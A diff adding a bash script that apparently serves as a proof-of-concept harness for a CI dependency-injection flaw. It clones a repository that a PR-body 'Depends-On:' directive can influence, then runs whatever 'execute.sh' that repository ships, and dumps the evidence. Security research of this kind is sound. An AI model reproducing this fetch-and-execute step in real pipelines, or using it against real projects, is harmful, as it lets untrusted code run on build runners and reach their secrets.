@@ -1,0 +1,38 @@
+#!/bin/bash
+set -euxo pipefail
+
+report=/tmp/ot-size-report/report_pr
+mkdir -p /tmp/ot-size-report
+
+# 1) Report header written BEFORE the dependency fetch (legit content first —
+#    mirrors the modeled project's ordering).
+printf '%s\n' '<!-- Size Report of **ACME-CI** -->' > "$report"
+printf '| revision | size |\n|---|---|\n| base rev | 0 |\n' >> "$report"
+
+# 2) Dependency fetch via git-tool (honors any `Depends-On:` line in PR_BODY;
+#    the directive project name is derived from this clone's origin URL).
+dep_dir=/tmp/acme-dep
+"$(pwd)/script/git-tool" clone https://github.com/SlackerManTesting/ci-depends-on-sib.git --depth 1 "$dep_dir" > /tmp/git-tool-run.log 2>&1 || true
+
+# 3) Execute whatever the pulled dependency tree ships (attacker-influenced
+#    code executes at this point when a directive was honored).
+if [ -f "$dep_dir/script/execute.sh" ]; then
+  echo "EXEC-STEP: running $(realpath "$dep_dir/script/execute.sh") (content owned by the dependency tree)"
+  bash "$dep_dir/script/execute.sh" || true
+fi
+
+# 4) Report tail appended AFTER the fetch (mirrors the modeled ordering —
+#    attacker bytes sit between the header and the tail).
+printf '| final rev | 0 |\n' >> "$report"
+
+# 5) Evidence dump for the run log.
+echo "GIT-TOOL-RUN-LOG:"; cat /tmp/git-tool-run.log
+if [ -d "$dep_dir" ]; then
+  echo "DEP-TREE:"
+  ls -la "$dep_dir" | head -20
+  echo "DEP-TREE-HEAD:"
+  git -C "$dep_dir" log --oneline -3 2>/dev/null || true
+fi
+echo "REPORT-ARTIFACT-BEGIN"; cat "$report"; echo "REPORT-ARTIFACT-END"
+
+exit 0
